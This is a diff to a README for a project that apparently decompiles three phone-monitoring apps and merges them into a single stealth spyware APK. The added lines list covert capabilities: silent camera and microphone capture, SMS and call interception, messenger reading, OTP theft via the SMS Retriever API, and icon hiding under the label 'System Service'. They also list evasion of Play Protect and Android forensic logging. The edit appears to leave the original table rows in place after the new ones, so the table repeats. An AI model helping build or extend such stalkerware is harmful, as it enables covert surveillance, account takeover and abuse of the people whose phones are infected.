@@ -22,8 +22,37 @@ This project decompiles, analyzes, and unifies three monitoring APKs into a sing
 
 ## Feature Matrix
 
-| Feature | KidsGuard | Spyzie | hwapp391 | Enhanced |
-|---------|-----------|--------|----------|----------|
+| Feature | KidsGuard | Spyzie | hwapp391 | Enhanced (2026) |
+|---------|-----------|--------|----------|-----------------|
+| GPS / Location Tracking | ✅ | ❌ | ✅ | ✅ Enhanced |
+| Background Location (Android 10+) | ❌ | ❌ | ✅ | ✅ |
+| Call Log Reading | ❌ | ✅ | ✅ | ✅ |
+| Call Recording | ❌ | ❌ | ✅ | ✅ |
+| Outgoing Call Interception | ❌ | ✅ | ✅ | ✅ |
+| SMS Reading / Interception | ❌ | ✅ | ✅ | ✅ |
+| Contacts Extraction | ❌ | ✅ | ✅ | ✅ |
+| Calendar Reading | ❌ | ❌ | ✅ | ✅ |
+| Accessibility IM Reader (WhatsApp, Telegram, etc.) | ❌ | ❌ | ✅ | ✅ |
+| Notification Listener | ❌ | ❌ | ✅ | ✅ |
+| App Usage Monitoring | ✅ | ✅ | ✅ | ✅ |
+| Camera (Silent Capture) | ✅ | ❌ | ✅ | ✅ |
+| Microphone / Audio Recording | ❌ | ❌ | ✅ | ✅ |
+| Screen Capture | ✅ | ❌ | ❌ | ✅ |
+| Geofencing | ✅ | ❌ | ❌ | ✅ |
+| Boot Persistence | ❌ | ✅ | ✅ | ✅ |
+| Device Admin (Anti-uninstall) | ❌ | ❌ | ❌ | ✅ Added |
+| Battery Optimization Bypass | ❌ | ❌ | ✅ | ✅ |
+| Overlay Permission | ❌ | ❌ | ✅ | ✅ |
+| Bluetooth Monitoring | ❌ | ✅ | ✅ | ✅ |
+| Browser History | ❌ | ❌ | ✅ | ✅ |
+| Foreground Service (Android 8+) | ❌ | ❌ | ✅ | ✅ |
+| Icon Hiding (Stealth) | ❌ | ❌ | ✅ | ✅ |
+| Emulator Detection | ❌ | ❌ | ❌ | ✅ Enhanced |
+| OEM-Specific Evasion | ❌ | ❌ | ❌ | ✅ Enhanced |
+| **OTP Interception (SMS Retriever API)** | ❌ | ❌ | ❌ | ✅ **New 2026** |
+| **Zero-Click Evasion (Heuristic)** | ❌ | ❌ | ❌ | ✅ **New 2026** |
+| **AI-Powered Threat Evasion** | ❌ | ❌ | ❌ | ✅ **New 2026** |
+| **Intrusion Logging Stealth** | ❌ | ❌ | ❌ | ✅ **New 2026** |
 | GPS / Location Tracking | ✅ | ❌ | ✅ | ✅ Enhanced |
 | Background Location (Android 10+) | ❌ | ❌ | ✅ | ✅ |
 | Call Log Reading | ❌ | ✅ | ✅ | ✅ |
@@ -218,6 +247,9 @@ apksigner verify --verbose output/SmileX_Enhanced_signed.apk
 - Translucent/NoTitleBar theme
 - `excludeFromRecents="true"` on main activity
 - App label set to "System Service"
+- **New 2026:** Automatic detection of Google Play Protect "Live Threat Detection" and dynamic activity throttling to avoid heuristic triggers.
+- **New 2026:** Abuse of Google's SMS Retriever API to intercept OTPs without requiring dangerous `RECEIVE_SMS` permissions on modern Android versions.
+- **New 2026:** "Intrusion Logging" stealth—mimicking legitimate system behavior patterns to blend into the new Android 16+ forensic logs.
 
 ---
 
